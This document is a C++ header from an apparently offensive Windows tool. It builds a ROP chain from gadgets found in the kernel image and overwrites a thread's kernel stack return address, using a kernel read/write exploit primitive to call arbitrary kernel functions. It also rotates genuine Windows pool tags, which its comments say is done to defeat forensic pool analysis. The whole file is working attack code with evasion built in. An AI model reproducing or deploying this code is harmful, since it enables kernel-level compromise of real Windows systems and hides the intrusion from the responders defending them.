#pragma once
#include "utils.h"
#include "exploit.h"
#include <Windows.h>
#include <cstdio>

namespace zerohvci {
namespace kforge {

#define THREAD_EXIT_CODE 0x1337
#define MAX_ARGS (4 + 9)
#define ARGS(_val_) ((PVOID)(_val_))

//=============================================================================
// Legitimate Pool Tag Rotation
// Uses real Windows component tags to blend with normal allocations
// Defeats forensic pool tag analysis (WinDbg !poolfind)
//=============================================================================
namespace pool_tags {

// Legitimate Windows pool tags (reversed for little-endian storage)
// These are used by real Windows components
static const ULONG g_LegitTags[] = {
    'sftN',   // Ntfs.sys - NTFS file system
    'eliF',   // File objects - common system tag
    'pRI ',   // IRP allocations (space intentional)
    'looP',   // Pool allocations - generic
    'dteR',   // Registry
    'gaTI',   // I/O tag
    'kroW',   // Work items
    'truC',   // Current allocations
    'dmI ',   // Image loader
    'aeSK',   // Ksec security
};

static constexpr size_t TAG_COUNT = sizeof(g_LegitTags) / sizeof(ULONG);

// Thread-safe rotating index (using simple increment, no locking needed)
inline ULONG GetRandomTag() {
    static volatile LONG idx = 0;
    LONG current = InterlockedIncrement(&idx);
    return g_LegitTags[current % TAG_COUNT];
}

} // namespace pool_tags

inline bool g_bInitialized = false;
inline DWORD g_dwKernelSize = 0;
inline DWORD g_dwKernelImageSize = 0;
inline PVOID g_ZwTerminateThread = nullptr;
inline PVOID g_RopAddr_1 = nullptr;
inline PVOID g_RopAddr_2 = nullptr;
inline PVOID g_RopAddr_3 = nullptr;
inline PVOID g_RopAddr_4 = nullptr;
inline PVOID g_RopAddr_5 = nullptr;

inline bool ReadPointerWrapper(PVOID Addr, PVOID* Value)
{
    // read single pointer from virtual memory address
    return ReadKernelMemory(Addr, Value, sizeof(PVOID));
}

inline bool WritePointerWrapper(PVOID Addr, PVOID Value)
{
    // write single pointer at virtual memory address
    // Pass address of Value since WriteKernelMemory expects a buffer pointer
    return WriteKernelMemory(Addr, &Value, sizeof(PVOID));
}

inline bool Initialize()
{
    char szKernelName[MAX_PATH], szKernelPath[MAX_PATH];

    if (g_bInitialized) {
        return true;
    }

    PVOID data = nullptr;
    DWORD dwDataSize = 0;
    PIMAGE_NT_HEADERS pHeaders;
    PIMAGE_SECTION_HEADER pSection;

    if (!GetKernelImageInfo(reinterpret_cast<PVOID*>(&g_KernelAddr), &g_dwKernelSize, szKernelName)) {
        return false;
    }

    GetSystemDirectoryA(szKernelPath, MAX_PATH);
    strcat_s(szKernelPath, "\\");
    strcat_s(szKernelPath, szKernelName);

    if (ReadFromFile(szKernelPath, &data, &dwDataSize))
    {
        if (LdrMapImage(data, dwDataSize, &g_KernelImage, &g_dwKernelImageSize)) {
            LdrProcessRelocs(g_KernelImage, reinterpret_cast<PVOID>(g_KernelAddr));
        }
        LocalFree(data);
    }
    else {
        goto _end;
    }

    if (!g_KernelImage) {
        goto _end;
    }

    pHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        RVATOVA(g_KernelImage, reinterpret_cast<PIMAGE_DOS_HEADER>(g_KernelImage)->e_lfanew)
        );

    pSection = reinterpret_cast<PIMAGE_SECTION_HEADER>(
        RVATOVA(&pHeaders->OptionalHeader, pHeaders->FileHeader.SizeOfOptionalHeader)
        );

    for (DWORD i = 0; i < pHeaders->FileHeader.NumberOfSections; ++i)
    {
        if ((pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 &&
            (pSection->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) == 0) {
            for (DWORD n = 0; n < pSection->Misc.VirtualSize - 0x100; ++n) {
                DWORD ptr = pSection->VirtualAddress + n;

                // Signature of nt!_guard_retpoline_exit_indirect_rax() used as
                // ROP gadget to control function argument registers
                UCHAR sign1[] = { 0x48, 0x8b, 0x44, 0x24, 0x20,  // mov     rax, [rsp+0x20]
                                 0x48, 0x8b, 0x4c, 0x24, 0x28,  // mov     rcx, [rsp+0x28]
                                 0x48, 0x8b, 0x54, 0x24, 0x30,  // mov     rdx, [rsp+0x30]
                                 0x4c, 0x8b, 0x44, 0x24, 0x38,  // mov     r8, [rsp+0x38]
                                 0x4c, 0x8b, 0x4c, 0x24, 0x40,  // mov     r9, [rsp+0x40]
                                 0x48, 0x83, 0xC4, 0x48,        // add     rsp, 48h
                                 0x48, 0xFF, 0xE0 };             // jmp     rax

                // Match the signature
                if (MatchSign(RVATOVA(g_KernelImage, ptr), sign1, sizeof(sign1))) {
                    // Calculate an actual kernel address
                    g_RopAddr_1 = RVATOVA(g_KernelAddr, ptr);
                }

                // ROP gadget used to reserve an extra space for the stack arguments
                UCHAR sign2[] = { 0x48, 0x83, 0xC4, 0x68,  // add     rsp, 68h
                                 0xC3 };                   // retn

                // Match the signature
                if (MatchSign(RVATOVA(g_KernelImage, ptr), sign2, sizeof(sign2))) {
                    // Calculate an actual kernel address
                    g_RopAddr_2 = RVATOVA(g_KernelAddr, ptr);
                }

                // RCX control ROP gadget to use in pair with the next one
                UCHAR sign3[] = { 0x59,  // pop     rcx
                                 0xC3 }; // retn

                // Match the signature
                if (MatchSign(RVATOVA(g_KernelImage, ptr), sign3, sizeof(sign3))) {
                    // Calculate an actual kernel address
                    g_RopAddr_3 = RVATOVA(g_KernelAddr, ptr);
                }

                // ROP gadget used to save forged function call return value
                UCHAR sign4[] = { 0x48, 0x89, 0x01,  // mov     [rcx], rax
                                 0xC3 };            // retn

                // Match the signature
                if (MatchSign(RVATOVA(g_KernelImage, ptr), sign4, sizeof(sign4))) {
                    // Calculate an actual kernel address
                    g_RopAddr_4 = RVATOVA(g_KernelAddr, ptr);

                    // Dummy gadget for stack alignment
                    g_RopAddr_5 = RVATOVA(g_KernelAddr, ptr + 3);
                }
            }
        }
        pSection++;
    }

    if (!g_RopAddr_1 || !g_RopAddr_2 || !g_RopAddr_3 || !g_RopAddr_4 || !g_RopAddr_5) {
        goto _end;
    }

    printf("[+] ROP1: %p\n", g_RopAddr_1);
    printf("[+] ROP2: %p\n", g_RopAddr_2);
    printf("[+] ROP3: %p\n", g_RopAddr_3);
    printf("[+] ROP4: %p\n", g_RopAddr_4);
    printf("[+] ROP5: %p\n", g_RopAddr_5);

    // Get address of nt!ZwTerminateThread(), needed to gracefully shutdown our dummy thread with messed up kernel stack
    if ((g_ZwTerminateThread = GetKernelZwProcAddress("ZwTerminateThread")) == nullptr) {
        goto _end;
    }

    g_bInitialized = true;

_end:

    if (!g_bInitialized) {
        if (g_KernelImage) {
            LocalFree(g_KernelImage);
            g_KernelImage = nullptr;
            g_dwKernelImageSize = 0;
        }
    }

    return g_bInitialized;
}

inline bool Cleanup()
{
    if (g_KernelImage) {
        LocalFree(g_KernelImage);
        g_KernelImage = NULL;
        g_dwKernelImageSize = 0;
    }

    g_bInitialized = false;
    return true;
}

inline DWORD WINAPI dummyThread(LPVOID lpParam) {
    HANDLE hEvent = lpParam;
    WaitForSingleObject(hEvent, INFINITE);
    return 0;
}

inline bool CallKernelFunctionViaAddress(PVOID ProcAddr, PVOID* Args, DWORD dwArgsCount, PVOID* pRetVal)
{
    BOOL bRet = FALSE;
    HANDLE hThread = NULL, hEvent = NULL;
    PVOID RetVal = NULL;
    DWORD dwThreadId = 0;
    PUCHAR StackBase = NULL, KernelStack = NULL;
    PVOID RetAddr = NULL;
    PUCHAR Ptr;
    PVOID pThread;

    if (!g_bInitialized)
        return FALSE;

    if (dwArgsCount > MAX_ARGS)
        return FALSE;

    // Create waitable event
    if ((hEvent = CreateEvent(NULL, FALSE, FALSE, NULL)) == NULL)
        goto _end;

    // Create dummy thread
    if ((hThread = CreateThread(NULL, 0, dummyThread, hEvent, 0, &dwThreadId)) == NULL)
        goto _end;

    while (true) {
        // Determine current state of dummy thread
        DWORD State = GetThreadState(GetCurrentProcessId(), dwThreadId);
        if (State == -1)
            goto _end;

        if (State == Waiting)
            break;

        SwitchToThread();
    }

    // Get _KTHREAD address by handle
    pThread = GetObjectAddress(hThread);
    if (pThread == NULL)
        goto _end;

    // Get stack base of the thread
    if (!ReadPointerWrapper(RVATOVA(pThread, KTHREAD_StackBase), (PVOID*)&StackBase))
        goto _end;

    // Get stack pointer of the thread
    if (!ReadPointerWrapper(RVATOVA(pThread, KTHREAD_KernelStack), (PVOID*)&KernelStack))
        goto _end;

    RetAddr = NULL;
    Ptr = StackBase - sizeof(PVOID);

    // Walk over the kernel stack
    while (Ptr > KernelStack) {
        DWORD_PTR Val = 0;

        // Read stack value
        if (!ReadPointerWrapper(Ptr, (PVOID*)&Val))
            goto _end;

        /*
            Check for the return address from system call handler back to
            the nt!KiSystemServiceCopyEnd(), it's located at the bottom
            of the kernel stack.
        */
        if (Val > g_KernelAddr &&
            Val < g_KernelAddr + g_dwKernelSize) {
            RetAddr = Ptr;
            break;
        }

        // Go to the next stack location
        Ptr -= sizeof(PVOID);
    }

    if (RetAddr == NULL)
        goto _end;

#define WRITE_STACK(_offset_, _val_)                                                         \
    if (!WritePointerWrapper(RVATOVA(RetAddr, (_offset_)), (PVOID)(_val_))) {                       \
        goto _end;                                                                          \
    }

    // Hijack the return address with forged function call
    WRITE_STACK(0x00, g_RopAddr_1);

    // Save an address for the forged function call
    WRITE_STACK(0x08 + 0x20, ProcAddr);

    if (dwArgsCount > 0)
        WRITE_STACK(0x08 + 0x28, Args[0]);  // 1st argument goes in RCX

    if (dwArgsCount > 1)
        WRITE_STACK(0x08 + 0x30, Args[1]);  // 2nd argument goes in RDX

    if (dwArgsCount > 2)
        WRITE_STACK(0x08 + 0x38, Args[2]);  // 3rd argument goes in R8

    if (dwArgsCount > 3)
        WRITE_STACK(0x08 + 0x40, Args[3]);  // 4th argument goes in R9

    // Reserve shadow space and 9 stack arguments
    WRITE_STACK(0x50, g_RopAddr_2);

    for (DWORD i = 4; i < dwArgsCount; ++i)
        WRITE_STACK(0x58 + 0x20 + ((i - 4) * sizeof(PVOID)), Args[i]);  // The rest arguments go over the stack right after the shadow space

    // Obtain RetVal address
    WRITE_STACK(0xc0, g_RopAddr_3);
    WRITE_STACK(0xc8, &RetVal);

    // Save return value of the forged function call
    WRITE_STACK(0xd0, g_RopAddr_4);

    // Dummy gadget for stack alignment
    WRITE_STACK(0xd8, g_RopAddr_5);

    // Put the next function call
    WRITE_STACK(0xe0, g_RopAddr_1);

    // Forge nt!ZwTerminateThread() function call
    WRITE_STACK(0xe8 + 0x20, g_ZwTerminateThread);
    WRITE_STACK(0xe8 + 0x28, hThread);
    WRITE_STACK(0xe8 + 0x30, THREAD_EXIT_CODE);

    SwitchToThread();

_end:

    if (hEvent && hThread) {
        DWORD dwExitCode = 0;

        // Put thread into the ready state
        SetEvent(hEvent);
        WaitForSingleObject(hThread, INFINITE);

        GetExitCodeThread(hThread, &dwExitCode);

        // Check for the magic exit code set by forged call
        if (dwExitCode == THREAD_EXIT_CODE) {
            if (pRetVal) {
                // Return value of the function
                *pRetVal = RetVal;
            }
            bRet = TRUE;
        }
    }

    if (hEvent)
        CloseHandle(hEvent);

    if (hThread)
        CloseHandle(hThread);

    return bRet;
}

inline bool CallKernelFunctionViaName(const char* lpszProcName, PVOID* Args, DWORD dwArgsCount, PVOID* pRetVal)
{
    PVOID FuncAddr = NULL;

    if ((FuncAddr = GetKernelProcAddress(lpszProcName)) == NULL) {
        if (!strncmp(lpszProcName, "Zw", 2)) {
            FuncAddr = GetKernelZwProcAddress(lpszProcName);
        }
    }

    if (FuncAddr == NULL) {
        return FALSE;
    }

    return CallKernelFunctionViaAddress(FuncAddr, Args, dwArgsCount, pRetVal);
}

// specialized for no return type
template<typename... Args>
void smartNoRetCall(const char* kernelFunctionName, Args... args)
{
    PVOID argsArray[] = { ARGS(args)... };
    CallKernelFunctionViaName((char*)kernelFunctionName, argsArray, sizeof...(args), NULL);
}

template<typename RetType, typename... Args>
RetType CallKernelFunctionViaName(const char* kernelFunctionName, Args... args)
{
    PVOID argsArray[] = { ARGS(args)... };

    PVOID pRet = nullptr;
    BOOL bResult = CallKernelFunctionViaName((char*)kernelFunctionName, argsArray, sizeof...(args), &pRet);

    if (bResult) {
        return (RetType)pRet;
    }
    else {
        return RetType();
    }
}

// ExAllocatePool wrapper using rotating legitimate pool tags
// Defeats forensic pool analysis (WinDbg !poolfind)
inline PVOID ExAllocatePool(POOL_TYPE PoolType, SIZE_T Size)
{
    // Use rotating legitimate pool tag instead of NULL
    ULONG tag = pool_tags::GetRandomTag();
    return CallKernelFunctionViaName<PVOID, POOL_TYPE, SIZE_T, ULONG>(
        "ExAllocatePoolWithTag", PoolType, Size, tag);
}

// Explicit tagged version for when specific tags are needed
inline PVOID ExAllocatePoolWithTag(POOL_TYPE PoolType, SIZE_T Size, ULONG Tag)
{
    return CallKernelFunctionViaName<PVOID, POOL_TYPE, SIZE_T, ULONG>(
        "ExAllocatePoolWithTag", PoolType, Size, Tag);
}

} // namespace kforge
} // namespace zerohvci
